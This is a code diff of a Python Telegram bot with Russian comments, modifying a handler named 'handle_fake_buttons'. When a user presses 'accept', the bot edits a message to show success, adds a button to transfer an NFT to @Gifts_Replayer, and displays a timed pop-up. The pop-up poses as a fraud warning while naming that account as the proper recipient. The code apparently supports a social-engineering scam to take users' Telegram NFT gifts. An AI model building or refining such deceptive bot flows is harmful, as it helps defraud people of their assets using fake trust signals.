@@ -157,15 +157,21 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
-    # Определяем, какой текст и кнопки ставить
     if action == "accept":
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
         ])
+        alert_text = (
+            "⚠️ Внимание!\n\n"
+            "Получатель в этом сервисе:\n"
+            "@Gifts_Replayer.\n\n"
+            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
+        )
     else:
         new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
+        alert_text = None
 
     kwargs = {
         "chat_id": callback.message.chat.id,
@@ -184,43 +190,34 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         kwargs["business_connection_id"] = business_connection_id
 
     try:
-        # 1. СНАЧАЛА РЕДАКТИРУЕМ СООБЩЕНИЕ (меняем текст и кнопку на Передать NFT)
+        # 1. СНАЧАЛА РЕДАКТИРУЕМ СООБЩЕНИЕ
         await bot.edit_message_text(**kwargs)
         
-        # 2. ПОТОМ ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО
-        if action == "accept":
-            alert_text = (
-                "⚠️ Внимание!\n\n"
-                "Получатель в этом сервисе:\n"
-                "@Gifts_Replayer.\n\n"
-                "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-            )
+        # 2. ДЕЛАЕМ НЕБОЛЬШУЮ ПАУЗУ, ЧТОБЫ ТЕЛЕФОН УСПЕЛ ОТРИСОВАТЬ НОВОЕ СООБЩЕНИЕ
+        await asyncio.sleep(0.8)
+        
+        # 3. ТЕПЕРЬ ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО
+        if alert_text:
             await callback.answer(alert_text, show_alert=True)
         else:
             await callback.answer()
 
     except TelegramBadRequest as e:
-        # Если сообщение уже изменено, просто показываем окно
-        if "message is not modified" in str(e).lower():
-            if action == "accept":
-                alert_text = (
-                    "⚠️ Внимание!\n\n"
-                    "Получатель в этом сервисе:\n"
-                    "@Gifts_Replayer.\n\n"
-                    "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-                )
+        error_msg = str(e).lower()
+        if "message is not modified" in error_msg:
+            if alert_text:
                 await callback.answer(alert_text, show_alert=True)
             else:
                 await callback.answer("Сообщение уже обработано.", show_alert=True)
         else:
             print(f"Ошибка редактирования: {e}")
-            await callback.answer("Не удалось изменить сообщение.", show_alert=True)
+            await callback.answer(f"Ошибка: {e}", show_alert=True)
             if ADMIN_ID:
                 try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
                 except: pass
     except Exception as e:
         print(f"Неизвестная ошибка: {e}")
-        await callback.answer("Ошибка", show_alert=True)
+        await callback.answer("Произошла ошибка.", show_alert=True)
 
 async def main():
     print("Бот запущен...")
